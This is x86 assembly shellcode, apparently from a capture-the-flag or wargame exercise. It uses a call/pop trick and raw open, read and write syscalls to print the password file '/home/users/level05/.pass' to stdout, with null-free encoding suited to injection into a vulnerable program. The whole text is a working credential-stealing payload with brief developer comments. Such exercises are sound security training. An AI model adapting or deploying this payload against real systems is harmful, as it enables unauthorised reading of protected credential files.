
global _start
section .text

_start:
  call _true_start
  db `/home/users/level05/.pass`, 0x0

_true_start:
  pop ebx
  sub esp, 0x40
  xor edx, edx
  xor ecx, ecx
  ; lea ebx, [rel pathname] ; not working in x86?

  ; call open(".../level05/.pass", O_RDONLY)
  ; mov eax, 0x5 is ok too
  xor eax, eax
  mov  al, 0x5
  int  0x80

  ; read(fd, &stack, 40)
  mov ebx, eax
  mov ecx, esp

  xor edx, edx
  mov dl, 0x28

  xor eax, eax
  mov al, 0x03
  int  0x80

  ; write(1, &stack, 40)
  xor ebx, ebx
  mov bl, 0x01

  mov ecx, esp

  xor edx, edx
  mov dl, 0x28

  xor eax, eax
  mov al, 0x04

  int  0x80

  ;pathname db `/home/users/level05/.pass`, 0x0
